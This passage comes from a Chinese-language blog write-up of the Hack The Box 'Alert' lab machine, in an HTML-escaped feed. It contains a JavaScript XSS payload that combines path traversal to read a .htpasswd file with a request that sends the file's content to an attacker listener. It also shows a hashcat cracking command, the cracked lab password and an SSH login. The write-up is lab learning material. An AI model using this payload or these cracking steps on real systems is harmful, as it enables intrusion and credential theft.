constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br>&lt;/pre&gt;<br><br></code></pre></td></tr></table></figure><p>可以看到<code>AuthUserFile /var/www/statistics.alert.htb/.htpasswd</code>​，于是读取一下对应的敏感信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>解码之后信息为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-attr">albert</span>:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>这是一串APR1(MD5-based)密码哈希，可以用hashcat进行解密</p><p>将上面另存为文档</p><p>​<code>hashcat -a 0 -m 1600  alert.hash /home/dream/桌面/rockyou.txt</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330214212-zj9obyh.png" alt="image"></p><p>解密成功为<code>manchesterunited</code>​</p><p>之后可以成功登陆<code>statistics.alert.htb</code>​</p><p>nmap一下可以看到开放了22端口</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215202-cjolve2.png" alt="image"></p><p>用刚刚获得的用户名密码ssh连接一下试试</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215431-rf0sv97.png" alt="image"></p><p>成功连接<br>​<img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215806-czq6bvu.png" alt="image"></p><p>获取第一个flag</p><hr><p>清明节回来本想继续做这个机器，结果发现居然要花钱了</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408151006-enyol34.png" alt="image"></p><p>后面的提权只能遗憾退场了，以后一定一次把机器渗透完，绝不拖延！</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
